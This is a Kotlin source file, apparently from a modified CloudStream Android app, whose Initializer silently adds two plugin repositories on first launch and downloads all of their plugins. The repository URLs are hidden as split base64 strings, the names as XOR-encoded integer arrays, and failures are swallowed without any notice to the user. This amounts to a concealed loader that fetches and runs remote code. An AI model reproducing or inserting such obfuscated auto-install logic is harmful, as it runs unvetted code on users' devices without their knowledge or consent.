package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

object Initializer {

    const val NEED_AUTO_DOWNLOAD = "need_auto_download_v1"
    private const val AUTO_REPO_FLAG = "auto_repo_added_v1"

    private fun decode(data: IntArray, key: Int = 7): String {
        val out = CharArray(data.size)
        for (i in data.indices) {
            out[i] = (data[i] xor key).toChar()
        }
        return String(out)
    }

    private val PREFS_NAME = intArrayOf(
        100, 107, 104, 114, 99, 116, 115, 114, 101, 102, 106
    )

    private val REPO_NAME_X1 = intArrayOf(66, 115, 115, 68, 107, 114, 99)
    private val REPO_NAME_X2 = intArrayOf(88, 121, 112, 86, 98, 101, 109)

    private const val URL_A1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNl"
    private const val URL_A2 = "cmNvbnRlbnQuY29tL0dpbGFu"
    private const val URL_A3 = "Z0FkaXRhbWEvTm9udG9ubW92"
    private const val URL_A4 = "aWVzL21haW4vcmVwby5qc29u"

    private const val URL_B1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNv"
    private const val URL_B2 = "bnRlbnQuY29tL0dpbGFuZ0FkaXRhbWEv"
    private const val URL_B3 = "TW92aWVLdS9tYWluL3JlcG8uanNvbg=="

    private fun repoA(): String =
        String(Base64.decode(URL_A1 + URL_A2 + URL_A3 + URL_A4, Base64.DEFAULT))

    private fun repoB(): String =
        String(Base64.decode(URL_B1 + URL_B2 + URL_B3, Base64.DEFAULT))

    fun start(activity: Activity) {
        val prefs = activity.getSharedPreferences(
            decode(PREFS_NAME),
            Activity.MODE_PRIVATE
        )

        val repo1 = RepositoryData(
            name = decode(REPO_NAME_X1),
            url = repoA(),
            iconUrl = null
        )

        val repo2 = RepositoryData(
            name = decode(REPO_NAME_X2),
            url = repoB(),
            iconUrl = null
        )

        CoroutineScope(Dispatchers.IO).launch {
            var repoChanged = false

            try {
                if (!prefs.getBoolean(AUTO_REPO_FLAG, false)) {
                    RepositoryManager.addRepository(repo1)
                    RepositoryManager.addRepository(repo2)
                    repoChanged = true

                    prefs.edit()
                        .putBoolean(AUTO_REPO_FLAG, true)
                        .putBoolean(NEED_AUTO_DOWNLOAD, false)
                        .apply()
                }
            } catch (_: Throwable) {
            }

            withContext(Dispatchers.Main) {
                // 🔔 PENTING: trigger reload ExtensionsFragment
                if (repoChanged) {
                    MainActivity.afterRepositoryLoadedEvent.invoke(true)
                }

                // kasih waktu repo discan
                delay(300)

                // 🔥 DOWNLOAD HARUS DI MAIN
                PluginsViewModel.downloadAll(activity, repo1.url, null)
                PluginsViewModel.downloadAll(activity, repo2.url, null)
            }
        }
    }
}
